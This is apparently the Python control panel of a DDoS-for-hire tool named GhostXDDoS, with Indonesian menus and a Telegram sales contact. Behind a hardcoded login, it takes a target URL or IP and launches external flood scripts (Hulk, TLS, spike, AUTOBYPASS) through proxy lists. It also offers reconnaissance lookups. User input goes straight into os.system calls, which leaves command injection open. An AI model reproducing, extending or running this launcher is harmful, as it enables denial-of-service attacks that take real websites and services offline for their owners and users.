
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    home()
    print(f'''
    
\033[1;32;40mTUNGGU DALAM HITUNGAN MUNDUR [ 5 ]

    ''')
    time.sleep(0.6)
    home()
    print(f'''
    
\033[1;34;40mTUNGGU DALAM HITUNGAN MUNDUR [ 4 ]

    ''')
    time.sleep(0.6)
    home()
    print(f'''
    
\033[1;32;40mTUNGGU DALAM HITUNGAN MUNDUR [ 3 ]

    ''')
    time.sleep(0.6)
    home()
    print(f"""
     
\033[1;34;40mTUNGGU DALAM HITUNGAN MUNDUR [ 2 ]

    """)
    time.sleep(0.6)
    home()
    print(f"""
    
\033[1;35;40mTUNGGU DALAM HITUNGAN MUNDUR [ 1 ]

    """)
    time.sleep(0.8)
    clear()
    home()

###################################

def tools():
    clear()
    si()
    home()
    print("")
    print(f'''
 \033[1;32;40m ████████╗ ██████╗  \033[1;34;40m██████╗ ██╗           
 \033[1;32;40m ╚══██╔══╝██╔═══██╗\033[1;34;40m██╔═══██╗██║
 \033[1;32;40m    ██║   ██║   ██║\033[1;34;40m██║   ██║██║
 \033[1;32;40m    ██║   ██║   ██║\033[1;34;40m██║   ██║██║  
 \033[1;32;40m    ██║   ╚██████╔╝\033[1;34;40m╚██████╔╝███████╗ 
 \033[1;32;40m    ╚═╝    ╚═════╝  \033[1;34;40m╚═════╝ ╚══════╝  \033[1;23;40m
     ╔══════╗
     ║tools ║          
  ╔═════════╝
  ║ geoip                     
  ║ reverseip                        
  ║ subnet-lookup         
  ║ asn-lookup                    
  ║ dns-lookup                
  ║ reverse-dns
  ║ reverse-dns          
  ╚════════════╝
''')


###################################

def si(): 
    print('     🔰 ONLINE [{on}] |📲 PENGGUNA [{hp}] | 🛰️ SERVER [{server}] ')
    print("")

###################################

def admin():
    home()
    print(' ')
    print(f'''
            ╔══════════════╩════════╦══════╩════════════════╗
            ║         ADMIN         ║        CONTACT        ║
            ╚═══════════════════════╩═══════════════════════╝
            ╔═══════════════════════╦═══════════════════════╗
            ║  ./GhostX-Mods.       ║ TELE: @AnakManis1     ║
            ║  ./GhostX-Mods.       ║ TELE: @AnakManis1     ║
            ║  ./GhostX-Mods.       ║ TELE: @AnakManis1     ║
            ║  ./GhostX-Mods.       ║ TELE: @AnakManis1     ║
            ║  ./GhostX-Mods.       ║ TELE: @AnakManis1     ║
            ║  ./GhostX-Mods.       ║ TELE: @AnakManis1     ║
            ║  ./GhostX-Mods.       ║ TELE: @AnakManis1     ║
            ║  ./GhostX-Mods.       ║ TELE: @AnakManis1     ║
            ╚═══════════════════════╩═══════════════════════╝
  
\033[1;34;40m📡 BERIKUT DAFTAR YANG IKUT DALAM PEMBANGUNAN TOOLS INI TERSEBUT, JIKA MAU MELAKUKAN PEMBELIAN LANGSUNG AJA KE CONTACT MEREKA 🛰️
''')

###################################
def layer7():
    si()
    clear()
    home()
    print(f'''
\033[1;0;40m[ LAYER7 ]
\033[1;34;40mNOTE USE:
JANGAN DISALAH GUNAKAN 💥
\033[1;0;40m    
 - crash
 - tls
 - bypass
 - bomb
 -
 
''')
###################################
def layer4():
    clear()
    si()
    home()
    print(f'''
\033[1;0;40m[ LAYER4 ]
\033[1;34;40mNOTE USE:
JANGAN DISALAH GUNAKAN 💥
\033[1;0;40m    
 - udp
 - tcp               
''')
###################################
def menu():
    sys.stdout.write(f"  \x1b]2;ghostxddos  --> Stars: [{bots}] | Online Users: [1] | Methods: [26] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print("")
    print("""
                     \033[1;32;40m╔═╗┬ ┬┌─┐┌─┐┌┬┐ \033[1;34;40m═╗ ╦ \033[1;32;40m╔╦╗╔╦╗┌─┐╔═╗                    
                     \033[1;32;40m║ ╦├─┤│ │└─┐ │  \033[1;34;40m╔╩╦╝ \033[1;32;40m║║ ║║│ │ ╚═╗                    
                     \033[1;32;40m╚═╝┴ ┴└─┘└─┘ ┴  \033[1;34;40m╩ ╚═ \033[1;32;40m═╩╝═╩╝└─┘╚═╝                    
                   
    \033[1;32;40m   ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " \033[1;34;40mHELP \033[1;32;40m" ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
   \033[1;32;40m    ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " \033[1;34;40mInstall \033[1;32;40m" Untuk Install PIP COMMAND.
   
   """)
#########################################################
def home():
    sys.stdout.write(f"   \x1b]2;ghostxddos  --> Stars: [{bots}] | Online Users: [1] | Methods: [26] | Bypass: [10] | Amps: [1]\x07")
    clear()
    si()
    print("")
    print("""
                     \033[1;32;40m╔═╗┬ ┬┌─┐┌─┐┌┬┐ \033[1;34;40m═╗ ╦ \033[1;32;40m╔╦╗╔╦╗┌─┐╔═╗                    
                     \033[1;32;40m║ ╦├─┤│ │└─┐ │  \033[1;34;40m╔╩╦╝ \033[1;32;40m║║ ║║│ │ ╚═╗                    
                     \033[1;32;40m╚═╝┴ ┴└─┘└─┘ ┴  \033[1;34;40m╩ ╚═ \033[1;32;40m═╩╝═╩╝└─┘╚═╝                    
                     
                          ╔═════════════════════╗
                          ║TELEGRAM: @AnakManis1║
                          ╚═════════════════════╝
                             ⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️
                   """)
 
#########################################################

def main():
    menu()
    while(True):
        cnc = input('''\033[0;37;42mRoot@GhostXDDoS\033[1;0;40m: ~# ''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "home":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "ADMIN" or cnc == "admin" or cnc == "adm" or cnc == "ADM":
            admin()
        elif cnc == "install" or cnc == "INSTALL" or cnc == "instal" or cnc == "INSTALL":
            os.system(f'python3 install.py')
            main()
            

############# LAYER 7 #################

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('\n')
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')
                print('\n')

        elif "tlsv2" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run tlsv2.go -site {url} -data {method}')
            except IndexError:
                print('\n')
                print('Usage: tlsv2 <url> METHODS<GET/POST>')
                print('Example: tlsv2 http://example.com GET')
                print('\n')
                
        elif "bomb" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node spike.js {url} {thread} {time}')
            except IndexError:
                print('\n')
                print('Usage: bomb.js <url> <threads> <time>')
                print('Example: bomb http://example.com 1500 150')
                print('\n')
                
        elif "tls" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4] 
                os.system(f'node TLS-SUPERV2.js {ip} {time} {rate} {thread} proxies.txt')
            except IndexError:
                print('\nUsage: tls <target> <time> <rate(32> <thread>')
                print('Example: tls https://example.com 150 32 4000\n\n')

        elif "git" in cnc:
            try:
                git = cnc.split()[1]
                os.system(f'git clone {git}')
            except IndexError:
                print('\nUsage: git clone <link>')
                print('Example: git clone https://github.com/ghostxmods/ghostxmods\n\n')

############# LAYER 4 #################

        elif "autobypass" in cnc:
            try:
                tcp = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./AUTOBYPASS {tcp} {ip} {port} {time}')
            except IndexError:
                print('Usage: autobypass <tcp> <ip> <port> <time>')

############# TOOLS #################
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')
                
        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('\nUsage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8 \n  ')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS (SOON)
TOOLS   ► SHOW TOOLS
ADMIN   ► OWNER - ADMIN
CLEAR   ► CLEAR TERMINAL
            ''')
def login():
    user = "user"
    passwd = "user"
    os.system("clear")
    print("")
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("⚡ PASSWORD SALAH")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome to ./GhostXDDoS")
        time.sleep(0.5)
        os.system("clear")
        os.system("git pull")
   
if __name__ == "__main__":
    login()
    ascii_vro()
    main()